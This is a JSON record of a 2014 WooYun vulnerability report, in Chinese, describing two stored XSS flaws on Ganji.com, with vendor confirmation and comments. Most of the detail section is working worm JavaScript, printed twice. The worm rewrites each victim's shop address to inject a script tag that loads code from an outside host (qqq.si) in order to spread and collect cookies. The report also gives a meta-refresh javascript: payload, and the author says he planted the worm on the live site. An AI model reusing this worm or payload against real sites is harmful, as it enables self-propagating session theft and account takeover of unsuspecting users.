{"id": 1038, "wybug_id": "wooyun-2014-072627", "wybug_title": "赶集网主站2个存储型XSS + 小蠕虫", "wybug_corp": "赶集网", "wybug_author": "0x_Jin", "wybug_date": "2014-08-16 13:50", "wybug_open_date": "2014-09-30 13:52", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "类型应用", "黑盒测试技巧", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向公众公开  简要描述： 58 百姓  这次就是赶集了~~~  赶集网什么都有 果然 真有XSS！ 详细说明：  漏洞存在于 店铺管理中心 > 服务店铺【长沙装修/装饰】房屋漏水专业维修 > 信息管理在添加分店的地址那 未做任何过滤 可直接插入！还有一处位于店铺描述做了过滤 但是不能跳出meta外 店铺描述的payload: 0,url=javascript:alert(/Jin/)\" HTTP-EQUIV=\"refresh\n\n地址：http://cs.ganji.com/fuwu_dian/1121114795x/得用safari 打开才能弹。。继续说上面那个店铺分店地址的存储型XSS那个xss可以任何浏览器都执行XSS，而赶集网本身未做cookie做httponly的保护 所以。。你懂的！另外也构造了个小蠕虫 只要你有店铺就会修改掉你的店铺地址为 xss代码地址为：http://www.ganji.com/fuwu_dian/1113454444x/csrf代码贴上：function Connection(url,callback){ if (window.XMLHttpRequest){       var xmlhttp=new XMLHttpRequest();    }  else{        var xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");    }    xmlhttp.onreadystatechange=function(){    if(xmlhttp.readyState==4&&xmlhttp.status==200)    {      callback(xmlhttp.responseText);    }  }xmlhttp.open(\"GET\",url,true);xmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");xmlhttp.send();}function GetPostId(){  Connection(\"http://www.ganji.com/service_store/manage/post_pub.php?action=edit\",function(yuanma){    var idzhengze = /post_id: \\d{6}/;    var postid = String(idzhengze.exec(yuanma)).split(\" \")[1];    var cityzhengze = /city_code\":\\d{4}/;    var citycode=String(cityzhengze.exec(yuanma)).split(\":\")[1];    var datazhengze = /sub_contact_data:\\{\"\\d{4}/;    var dataid = String(datazhengze.exec(yuanma)).split(\"\\\"\")[1];    if(dataid!=\"undefined\"){      editxss(dataid,citycode,postid);    }    else{      editxss(\"x0\",citycode,postid);    }  })}GetPostId();function editxss(dataid,cityid,postid){  var xsscode = \"<script src=//qqq.si/wQ0Xtm></script>\";  var address=\"http://www.ganji.com/service_store/ajax/index.php?vaction=sub_contact&data%5B\"+dataid+\"%5D%5Baddress%5D=\"+encodeURI(xsscode)+\"&data%5B\"+dataid+\"%5D%5Bdistrict_id%5D=1&data%5B\"+dataid+\"%5D%5Bstreet_id%5D=0&data%5B\"+dataid+\"%5D%5Bphone%5D=400-1111111&data%5B\"+dataid+\"%5D%5Bflag%5D=u&city=\"+cityid+\"&post_id=\"+postid+\" \";  Connection(address,function(){alert('ok')});}这段代码是我X入到JS的 只要访问了带有我js代码的页面就也会修改自己页面的店铺地址为xss代码一直这样传下去 并获得cookie另外做了个演示视频：http://xss1.com/ganji-xss.mp4   漏洞证明：  漏洞存在于 店铺管理中心 > 服务店铺【长沙装修/装饰】房屋漏水专业维修 > 信息管理在添加分店的地址那 未做任何过滤 可直接插入！还有一处位于店铺描述做了过滤 但是不能跳出meta外 店铺描述的payload: 0,url=javascript:alert(/Jin/)\" HTTP-EQUIV=\"refresh\n\n地址：http://cs.ganji.com/fuwu_dian/1121114795x/得用safari 打开才能弹。。继续说上面那个店铺分店地址的存储型XSS那个xss可以任何浏览器都执行XSS，而赶集网本身未做cookie做httponly的保护 所以。。你懂的！另外也构造了个小蠕虫 只要你有店铺就会修改掉你的店铺地址为 xss代码地址为：http://www.ganji.com/fuwu_dian/1113454444x/csrf代码贴上：function Connection(url,callback){ if (window.XMLHttpRequest){       var xmlhttp=new XMLHttpRequest();    }  else{        var xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");    }    xmlhttp.onreadystatechange=function(){    if(xmlhttp.readyState==4&&xmlhttp.status==200)    {      callback(xmlhttp.responseText);    }  }xmlhttp.open(\"GET\",url,true);xmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");xmlhttp.send();}function GetPostId(){  Connection(\"http://www.ganji.com/service_store/manage/post_pub.php?action=edit\",function(yuanma){    var idzhengze = /post_id: \\d{6}/;    var postid = String(idzhengze.exec(yuanma)).split(\" \")[1];    var cityzhengze = /city_code\":\\d{4}/;    var citycode=String(cityzhengze.exec(yuanma)).split(\":\")[1];    var datazhengze = /sub_contact_data:\\{\"\\d{4}/;    var dataid = String(datazhengze.exec(yuanma)).split(\"\\\"\")[1];    if(dataid!=\"undefined\"){      editxss(dataid,citycode,postid);    }    else{      editxss(\"x0\",citycode,postid);    }  })}GetPostId();function editxss(dataid,cityid,postid){  var xsscode = \"<script src=//qqq.si/wQ0Xtm></script>\";  var address=\"http://www.ganji.com/service_store/ajax/index.php?vaction=sub_contact&data%5B\"+dataid+\"%5D%5Baddress%5D=\"+encodeURI(xsscode)+\"&data%5B\"+dataid+\"%5D%5Bdistrict_id%5D=1&data%5B\"+dataid+\"%5D%5Bstreet_id%5D=0&data%5B\"+dataid+\"%5D%5Bphone%5D=400-1111111&data%5B\"+dataid+\"%5D%5Bflag%5D=u&city=\"+cityid+\"&post_id=\"+postid+\" \";  Connection(address,function(){alert('ok')});}这段代码是我X入到JS的 只要访问了带有我js代码的页面就也会修改自己页面的店铺地址为xss代码一直这样传下去 并获得cookie另外做了个演示视频：http://xss1.com/ganji-xss.mp4   修复方案：  万年不变的修复建议。。。。 其实我觉得更多的是 严谨。这次 58 百姓 赶集都出在不严谨这条路上！   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-18 09:37 厂商回复： 感谢白帽子。如果下次有乌云审核不通过的漏洞，欢迎直接提交给我们'我爱乌云' == 'security at ganji. com'.replace('at','@').replace(/ /g,'') 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-16 14:42 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  此号被x。by 0x_jin    \n     2014-08-16 14:59 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  果然有xss    \n     2014-08-16 20:54 |    \t\tJack.Chalres \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:15        | ..............)\t\t \n  果然 真有XSS！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}